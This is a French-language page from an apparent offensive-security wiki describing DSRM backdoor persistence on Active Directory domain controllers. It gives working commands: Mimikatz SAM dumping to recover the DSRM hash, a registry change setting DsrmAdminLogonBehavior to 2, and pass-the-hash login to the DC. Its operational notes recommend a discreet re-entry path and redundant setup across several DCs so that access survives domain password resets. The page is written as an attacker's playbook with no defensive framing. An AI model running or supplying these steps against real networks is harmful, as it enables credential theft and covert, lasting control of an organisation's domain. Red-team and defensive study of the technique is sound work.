---
order: 11
title: "DSRM : le compte de porte dérobée local du contrôleur de domaine"
description: "Utiliser l'administrateur local du mode de restauration des services d'annuaire (Directory Services Restore Mode) d'un contrôleur de domaine pour la persistance : récupérer son hash et configurer DsrmAdminLogonBehavior afin que le compte DSRM puisse s'authentifier sur le réseau auprès du DC."
keywords:
  - DSRM
  - DsrmAdminLogonBehavior
  - SafeModePassword
  - contrôleur de domaine
  - persistance de domaine
---

# DSRM

Chaque contrôleur de domaine conserve un compte `Administrator` **local**, distinct de celui du domaine, utilisé pour le **Directory Services Restore Mode** (DSRM). Son mot de passe est le mot de passe SafeMode défini lors de la promotion du serveur, et il n'est presque jamais renouvelé. Cela en fait un compte de persistance idéal : récupérez son hash une seule fois, basculez une valeur de registre pour qu'il puisse se connecter sur le réseau, et vous conservez un accès administrateur au DC même après la réinitialisation de toutes les informations d'identification du **domaine**.

## Mise en place

Avec SYSTEM/admin sur un DC :

```text
# 1. Recover the DSRM account hash from the DC's local SAM
mimikatz: token::elevate ; lsadump::sam
# 2. Allow the DSRM account to authenticate over the network (not just at the console)
#    HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2 (DWORD)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

Authentifiez-vous ensuite auprès du DC avec le hash DSRM par pass-the-hash :

```text
# The DSRM account is LOCAL to the DC, so authenticate with .\Administrator
sekurlsa::pth /domain:<DC-hostname> /user:Administrator /ntlm:<dsrm-nthash> /run:powershell.exe
```

## Les détails essentiels

- Valeurs de `DsrmAdminLogonBehavior` : `0`/absent = ouverture de session DSRM uniquement en mode restauration ; `1` = autorisée lorsque AD DS est arrêté ; **`2` = toujours autorisée**, y compris l'ouverture de session réseau normale. La valeur `2` est ce qui active la persistance.
- Le compte DSRM est **local à ce DC**, vous vous authentifiez donc contre le nom d'hôte du DC (`.\Administrator`), et non contre le domaine.
- Son hash est indépendant de l'administrateur du domaine, de sorte que renouveler les mots de passe du domaine (même `krbtgt`) ne vous évince **pas** ; seule la réinitialisation du mot de passe DSRM sur ce DC le fait.

## Notes d'exploitation

- Ceci survit aux redémarrages et aux réinitialisations de mots de passe à l'échelle du domaine, ce qui le rend plus robuste que [Skeleton Key](skeleton-key.md) ; le compromis est la modification unique du registre.
- Il donne un accès administrateur local sur le DC, ce qui équivaut à une compromission du domaine (dump de NTDS, DCSync, etc.), donc associez-le à un chemin de ré-entrée discret.
- Chaque DC possède son propre compte DSRM ; configurez-le sur plus d'un DC pour la redondance.

## Outils

- **Mimikatz** (`lsadump::sam`, `sekurlsa::pth`) : récupérer le hash DSRM et l'utiliser.
- **Impacket / NetExec** : pass-the-hash vers l'administrateur local du DC une fois la clé de registre définie.

## Références

- [ADSecurity: Sneaky AD Persistence #13, DSRM persistence v2 (Sean Metcalf)](https://adsecurity.org/?p=1785)
- [The Hacker Recipes: DSRM persistence](https://www.thehacker.recipes/ad/persistence/dsrm)
- [MITRE ATT&CK T1003.003 / directory data store](https://attack.mitre.org/techniques/T1003/003/)
